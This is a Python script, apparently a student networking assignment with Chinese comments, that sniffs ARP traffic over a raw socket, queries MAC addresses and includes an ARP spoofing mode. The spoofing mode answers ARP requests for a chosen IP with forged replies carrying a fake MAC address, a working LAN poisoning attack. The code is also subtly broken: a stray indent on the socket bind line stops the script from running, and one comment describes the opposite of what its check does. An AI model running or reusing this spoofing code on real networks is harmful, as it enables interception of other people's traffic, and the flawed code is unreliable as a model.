import os 
import sys 
import socket
import struct
import re
import uuid
import binascii


def print_usage(): #  展示使用說明
	print("[ ARP sniffer and spoof program ]")
	print("Format :")
	print("1) python3 ./arp -l -a")
	print("2) python3 ./arp -l <filter_ip_address>")
	print("3) python3 ./arp -q <query_ip_address>")
	print("4) python3 ./arp <fake_mac_address> <target_ip_address>")


def show_arp(sock): #  for python3 ./arp -l -a
	print("[ ARP sniffer and spoof program ]")
	print("### ARP sniffer mode ###")

	while True:
		packet = sock.recvfrom(65535) #  返回(data, address), 其中data是包含接收資料的字串,address是傳送資料的socket地址
		ethernet_header =  packet[0][0:14] #  根據課本APR Packet Format, 前14bytes為ethernet header
		ethernet_detailed = struct.unpack("!6s6s2s", ethernet_header) #  struct module主要是拿來處理C資料結構的,unpack用來解包並返回一個tuple,!:network(= big-endian),s: string
		arp_header = packet[0][14:42] #  根據課本APR Packet Format, 15~42 為arp reqyest/reply header
		arp_detailed = struct.unpack("2s2s1s1s2s6s4s6s4s", arp_header)


		ethertype = ethernet_detailed[2]
		if ethertype != b'\x08\x06': #  過濾arp以外的封包
			continue

		print("Get ARP packet - Who has " + socket.inet_ntoa(arp_detailed[8]) + " ?					Tell " + socket.inet_ntoa(arp_detailed[6])) #  inet_ntoa將32位元之packed_ip轉換為標準分隔字符字串



def show_arp_with_filter(sock, filter_ip): #  for python3 ./arp -l <filter_ip_address>
	print("[ ARP sniffer and spoof program ]")
	print("### ARP sniffer mode ###")

	while True:
		packet = sock.recvfrom(65535) #  返回(data, address), 其中data是包含接收資料的字串,address是傳送資料的socket地址
		ethernet_header =  packet[0][0:14] #  根據課本APR Packet Format, 前14bytes為ethernet header
		ethernet_detailed = struct.unpack("!6s6s2s", ethernet_header) # struct module主要是拿來處理C資料結構的,unpack用來解包並返回一個tuple,!:network(= big-endian),s: string
		arp_header = packet[0][14:42] #  根據課本APR Packet Format, 15~42 為arp reqyest/reply header
		arp_detailed = struct.unpack("2s2s1s1s2s6s4s6s4s", arp_header)

		ethertype = ethernet_detailed[2] 
		if ethertype != b'\x08\x06': #  過濾arp以外的封包
			continue

		if socket.inet_ntoa(arp_detailed[6]) != filter_ip and socket.inet_ntoa(arp_detailed[8]) != filter_ip: #  過濾指定ip以外的封包
			continue

		print("Get ARP packet - Who has " + socket.inet_ntoa(arp_detailed[8]) + " ?					Tell " + socket.inet_ntoa(arp_detailed[6])) #  inet_ntoa將32位元之packed_ip轉換為標準分隔字符字串


def query_MAC(sock, query_ip): #  python3 ./arp -q <query_ip_address> 
	print("[ ARP sniffer and spoof program ]")
	print("### ARP query mode ###")

	mac=uuid.UUID(int = uuid.getnode()).hex[-12:] # getnode(): 取得主機硬體位置, UUID通過MAC地址, 時間戳, 名稱空間, 隨機數, 偽隨機數來保證生成ID的唯一性
	
	source_mac = binascii.unhexlify(mac.replace(':', '')) #  binascii.unhexlify(hexstr)：從十六進位制字串hexstr返回二進位制資料
	dest_mac = binascii.unhexlify("ff:ff:ff:ff:ff:ff".replace(':', '')) #  填入廣播MAC位置
	protocol = 0x0806 # 0x0806 is for ARP, frame type field為2bytes長

	ethernet_header_send = struct.pack("!6s6sH", dest_mac, source_mac, protocol) # 建立ethernet header

	hard_type = 1  #  ethernet
	prot_type = 0x0800  #  TCP type
	hard_len = 6  #  hard type field length 
	prot_len = 4  #  prot type field length
	operation = 1  #  1:request/2:reply
	source_ip = socket.inet_aton(socket.gethostbyname(socket.gethostname())) #  本機ip位置
	dest_ip = socket.inet_aton(query_ip) #  欲查詢之目的ip位置
	
	arp_header_send = struct.pack("!HHBBH6s4s6s4s", hard_type, prot_type, hard_len, prot_len, operation, source_mac, source_ip, binascii.unhexlify("00:00:00:00:00:00".replace(':', '')), dest_ip) # 建立arp header

	request = ethernet_header_send + arp_header_send #  建立ARP請求封包
	sock.send(request) #  透過socket送出ARP request




	while True:
		packet = sock.recvfrom(65535) #  返回(data, address), 其中data是包含接收資料的字串,address是傳送資料的socket地址
		ethernet_header =  packet[0][0:14] #  根據課本APR Packet Format, 前14bytes為ethernet header
		ethernet_detailed = struct.unpack("!6s6s2s", ethernet_header) # struct module主要是拿來處理C資料結構的,unpack用來解包並返回一個tuple,!:network(= big-endian),s: string
		arp_header = packet[0][14:42] #  根據課本APR Packet Format, 15~42 為arp reqyest/reply header
		arp_detailed = struct.unpack("2s2s1s1s2s6s4s6s4s", arp_header)
	
		ethertype = ethernet_detailed[2] 
		if ethertype != b'\x08\x06': #  過濾arp以外的封包
			continue

		if arp_detailed[4] != b'\x00\x02' : #  過濾arp reply以外的封包
			continue

		if socket.inet_ntoa(arp_detailed[6]) == query_ip : #  當目標ip位置為本機才接收
			byte_array = bytearray(arp_detailed[5]).hex()
			target_mac = ":".join([byte_array[e:e+2] for e in range(0,11,2)]) #  將bytearray轉變成MAC address形式

			print("MAC address of " + query_ip + " is " + target_mac)
			break

		
def arp_spoof(sock, fake_mac, target_ip): #  python3 ./arp <fake_mac_address> <target_ip_address>
	print("[ ARP sniffer and spoof program ]")
	print("### ARP spoof mode ###")

	while True:
		packet = sock.recvfrom(65535) #  返回(data, address), 其中data是包含接收資料的字串,address是傳送資料的socket地址
		ethernet_header =  packet[0][0:14] #  根據課本APR Packet Format, 前14bytes為ethernet header
		ethernet_detailed = struct.unpack("!6s6s2s", ethernet_header) # struct module主要是拿來處理C資料結構的,unpack用來解包並返回一個tuple,!:network(= big-endian),s: string
		arp_header = packet[0][14:42] #  根據課本APR Packet Format, 15~42 為arp reqyest/reply header
		arp_detailed = struct.unpack("2s2s1s1s2s6s4s6s4s", arp_header)

		ethertype = ethernet_detailed[2] 
		if ethertype != b'\x08\x06': #  過濾arp以外的封包
			continue

		if arp_detailed[4] != b'\x00\x01' : #  過濾arp reply以外的封包
			continue


		if target_ip == socket.inet_ntoa(arp_detailed[8]): #  如果收到的ARP reply封包之target ip == 我們欲偽造的ip address
			print("Get ARP packet - Who has " + socket.inet_ntoa(arp_detailed[8]) + " ?					Tell " + socket.inet_ntoa(arp_detailed[6])) #  inet_ntoa將32位元之packed_ip轉換為標準分隔字符字串
			source_mac = binascii.unhexlify(fake_mac.replace(':', '')) #  我們欲傳回的偽造MAC address

			byte_array = bytearray(arp_detailed[5]).hex()
			target_mac = ":".join([byte_array[e:e+2] for e in range(0,11,2)]) #  將bytearray轉變成MAC address形式
			dest_mac = binascii.unhexlify(target_mac.replace(':', '')) #  填入收到之ARP request之source MAC address
			protocol = 0x0806 # 0x0806 if for ARP, frame type field為2bytes長

			ethernet_header_send = struct.pack("!6s6sH", dest_mac, source_mac, protocol) # 建立ethernet header

			hard_type = 1  #  ethernet
			prot_type = 0x0800  #  TCP type
			hard_len = 6  #  hard type field length 
			prot_len = 4  #  prot type field length
			operation = 2  #  1:request/2:reply
			source_ip = socket.inet_aton(socket.inet_ntoa(arp_detailed[8])) #  本機ip位置
			dest_ip = socket.inet_aton(socket.inet_ntoa(arp_detailed[6])) #  欲查詢之目的ip位置
			
			arp_header_send = struct.pack("!HHBBH6s4s6s4s", hard_type, prot_type, hard_len, prot_len, operation, source_mac, source_ip, dest_mac, dest_ip) # 建立arp header

			reply = ethernet_header_send + arp_header_send #  建立ARP reply封包
			
			print("Sent ARP Reply : " + socket.inet_ntoa(arp_detailed[8]) + " is " + fake_mac)
			sock.send(reply) #  透過socket送出ARP reply封包
			print("Send successfully")



if os.geteuid() != 0: #   geteuid返回process該對於文件與資源的訪問權限,0為root
	exit("ERRPR: You must be root to use this tool")

#  PF_PACKET: 在data link收發封包的應用接口,所有接收到的封包都包含完整的header和data部份
#  SOCK_RAW: 它與其他socket的不同之處在於它工作在網路層或資料鍊結層,而其他型別socket工作在傳輸層,只能進行傳輸層資料操作
#  htons(): 將16bit整數從host byte order 轉換成 network byte order
sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)) #  建立socket物件, 第三的參數為指明所要接收的協議類型, 這裡表示去捕捉所有協議的ethernet frame

sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #  設定socket選項這裡表示允許當socket關閉後,本地端用於該socket的port number可以立即重新使用
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) #  設定socket選項這裡表示允許廣播位址傳送和接收封包
#sock.bind(("enp0s3", 0)) #  將引數繫結到socket, 地址以tuple（host,port）的形式表示。
 sock.bind(("enp2s0f5", 0)) 
#sock.bind(("s1-eth1", 0))
# sock.bind((os.listdir('/sys/class/net/')[0], 0))

ip = re.compile(r'^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')  #  判斷輸入字串是否為合法ip形式
mac = re.compile(r'^\s*([0-9a-fA-F]{2,2}:){5,5}[0-9a-fA-F]{2,2}\s*$') #  判斷輸入字串是否為合法MAC address形式
if len(sys.argv) == 2 and sys.argv[1] == "-help":
	print_usage()
elif len(sys.argv) == 3 and sys.argv[1] == "-l" and sys.argv[2] == "-a":
	show_arp(sock)
elif len(sys.argv) == 3 and sys.argv[1] == "-l" and ip.match(sys.argv[2]):
	show_arp_with_filter(sock, sys.argv[2])
elif len(sys.argv) == 3 and sys.argv[1] == "-q" and ip.match(sys.argv[2]):
	query_MAC(sock, sys.argv[2])
elif len(sys.argv) == 3 and mac.match(sys.argv[1]) and ip.match(sys.argv[2]):
	arp_spoof(sock, sys.argv[1], sys.argv[2])
else:
	print_usage()
